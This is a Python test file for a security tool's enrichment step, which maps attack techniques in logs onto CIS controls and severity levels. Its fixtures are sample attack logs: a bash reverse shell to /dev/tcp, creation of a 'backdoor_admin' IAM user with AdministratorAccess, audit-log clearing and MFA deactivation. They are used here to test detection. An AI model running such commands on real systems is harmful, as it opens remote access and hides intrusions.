"""
test_attack_enrich.py
=====================
Tests the ATT&CK-pivot enrichment that the live pipeline calls after Phase 1d.
Zero-dep (the pivot is pure Python), so it runs without the heavy pipeline.

    python3 test_attack_enrich.py
"""

from __future__ import annotations

import os

from attack_enrich import enrich_findings

_CLOUDTRAIL_ATTACK = (
    '{"eventName":"CreateUser","eventSource":"iam.amazonaws.com",'
    '"requestParameters":{"userName":"backdoor_admin"}}\n'
    '{"eventName":"AttachUserPolicy","eventSource":"iam.amazonaws.com",'
    '"requestParameters":{"policyArn":"arn:aws:iam::aws:policy/AdministratorAccess"}}'
)
_BENIGN = "Jul 16 09:00:01 web01 sshd[5001]: Accepted publickey for deploy from 10.0.0.9"


def test_enrich_adds_controls_keyword_missed():
    findings = {"cis_controls_mapping": {"control_ids": []}}
    prov = enrich_findings(_CLOUDTRAIL_ATTACK, "cloudtrail", findings)
    ctrls = set(findings["cis_controls_mapping"]["control_ids"])
    assert {"Control 5", "Control 6"} <= ctrls
    assert prov["technique_ids"]          # techniques detected
    assert set(prov["controls_added"]) == ctrls  # all were "added" (started empty)


def test_enrich_merges_with_existing():
    findings = {"cis_controls_mapping": {"control_ids": ["Control 3"]}}
    enrich_findings(_CLOUDTRAIL_ATTACK, "cloudtrail", findings)
    ctrls = findings["cis_controls_mapping"]["control_ids"]
    assert "Control 3" in ctrls and "Control 6" in ctrls
    # sorted by control number
    assert ctrls == sorted(ctrls, key=lambda c: int(c.split()[-1]))


def test_provenance_chain_is_complete():
    findings = {"cis_controls_mapping": {"control_ids": []}}
    prov = enrich_findings(_CLOUDTRAIL_ATTACK, "cloudtrail", findings)
    assert prov["trace"], "expected a control←technique←rule trace"
    row = prov["trace"][0]
    assert {"control_id", "technique_id", "rule_id", "rule_level"} <= set(row)
    assert findings["attack_pivot"] is prov


def test_severity_raised_to_rule_level():
    # reverse shell is a 'critical' Sigma rule → severity bumped from low
    findings = {"cis_controls_mapping": {"control_ids": []}, "severity": "low"}
    enrich_findings("Jul 16 09:00:01 h bash[1]: bash -i >& /dev/tcp/10.0.0.1/4444", "syslog", findings)
    assert findings["severity"] == "critical"
    # never lowers an already-higher severity
    findings2 = {"cis_controls_mapping": {"control_ids": []}, "severity": "critical"}
    enrich_findings('{"eventName":"CreateAccessKey","eventSource":"iam.amazonaws.com"}', "cloudtrail", findings2)
    assert findings2["severity"] == "critical"


def test_benign_adds_nothing():
    findings = {"cis_controls_mapping": {"control_ids": []}}
    prov = enrich_findings(_BENIGN, "syslog", findings)
    assert prov == {}
    assert findings["cis_controls_mapping"]["control_ids"] == []
    assert "attack_pivot" not in findings


def test_disabled_is_noop():
    os.environ["FURIX_ATTACK_PIVOT"] = "0"
    try:
        findings = {"cis_controls_mapping": {"control_ids": []}}
        assert enrich_findings(_CLOUDTRAIL_ATTACK, "cloudtrail", findings) == {}
        assert findings["cis_controls_mapping"]["control_ids"] == []
    finally:
        os.environ.pop("FURIX_ATTACK_PIVOT", None)


def test_new_rules_detect_more_attacks():
    # rules added this session — each should map its log to a control via the pivot
    cases = [
        ("EventID: 1102 The audit log was cleared", "windows_evtx", "Control 8"),
        ('{"eventName":"StopLogging","eventSource":"cloudtrail.amazonaws.com"}', "cloudtrail", "Control 8"),
        ("Jul 16 09:00:01 h bash[1]: bash -i >& /dev/tcp/10.0.0.1/4444", "syslog", "Control 13"),
        ('{"eventType":"user.mfa.factor.deactivate","published":"x"}', "okta_sso", "Control 6"),
    ]
    for raw, lt, expected in cases:
        findings = {"cis_controls_mapping": {"control_ids": []}}
        enrich_findings(raw, lt, findings)
        assert expected in findings["cis_controls_mapping"]["control_ids"], (lt, expected)


if __name__ == "__main__":
    import sys, traceback
    tests = [(n, f) for n, f in sorted(globals().items())
             if n.startswith("test_") and callable(f)]
    failed = 0
    for name, fn in tests:
        try:
            fn()
            print(f"  PASS  {name}")
        except Exception:
            failed += 1
            print(f"  FAIL  {name}")
            traceback.print_exc()
    print(f"\n{len(tests) - failed}/{len(tests)} attack-enrich tests passed")
    sys.exit(1 if failed else 0)
